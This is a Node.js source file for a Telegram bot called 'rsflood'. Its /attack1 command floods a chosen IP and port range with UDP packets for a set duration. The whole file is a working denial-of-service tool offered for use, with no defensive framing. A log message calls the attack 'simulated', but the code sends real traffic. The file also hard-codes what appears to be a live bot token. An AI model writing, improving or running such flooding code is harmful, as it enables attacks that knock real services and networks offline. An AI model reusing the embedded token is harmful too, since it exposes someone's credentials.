const TelegramBot = require('node-telegram-bot-api');
const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const crypto = require('crypto');
const process = require('process');

// Replace with your Telegram bot token
const token = '6310163818:AAFyvNq9RxwpHGezbdYTETIbvNNj-_suSgM';

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, { polling: true });

const newSocket = (host, port) => {
  const socket = dgram.createSocket('udp4');
  socket.connect(port, host, (err) => {
    if (err) {
      console.error(`[rsflood] Error connecting socket: ${err.message}`);
    }
  });
  return socket;
};

const runUDPAttack = (ip, port, numThreads, duration) => {
  let floodInstances = [];

  const runUDP = (target, port) => {
    console.log(`[rsflood] Starting simulated attack on thread...`);
    let currentPort = port + 1;
    const socketList = [];
    
    for (let i = 0; i < 20; i++) {
      currentPort += 1;
      const [host, port] = target.split(':');
      const socket = newSocket(host, parseInt(port) + i);
      socketList.push(socket);
    }

    const msg = crypto.randomBytes(32);

    setInterval(() => {
      for (const socket of socketList) {
        socket.send(msg, (err) => {
          if (err) {
            console.error(`[rsflood] Error sending message: ${err.message}`);
          }
        });
      }
    }, 0);
  };

  console.log(`[rsflood] Starting attack against ${ip}:${port}...`);
  console.log("[rsflood] Starting threads...");

  for (let i = 0; i < numThreads; i++) {
    port += 30;
    const target = `${ip}:${port}`;
    runUDP(target, port);
  }

  console.log("[rsflood] All threads were created.");

  if (duration !== 0) {
    setTimeout(() => {
      console.log("[rsflood] Attack finished.");
      process.exit(0);
    }, duration * 1000);
  }
};

// Listen for /attack1 command
bot.onText(/\/attack1 (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const [ip, port, numThreads, duration] = match[1].split(' ');

  if (!ip || isNaN(port) || isNaN(numThreads) || isNaN(duration)) {
    bot.sendMessage(chatId, 'Invalid parameters. Usage: /attack1 <ip> <port> <num_threads> <time>');
    return;
  }

  bot.sendMessage(chatId, `Starting attack on ${ip}:${port} with ${numThreads} threads for ${duration} seconds.`);
  runUDPAttack(ip, parseInt(port), parseInt(numThreads), parseInt(duration));
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Use /attack1 <ip> <port> <num_threads> <time> to start an attack.');
});
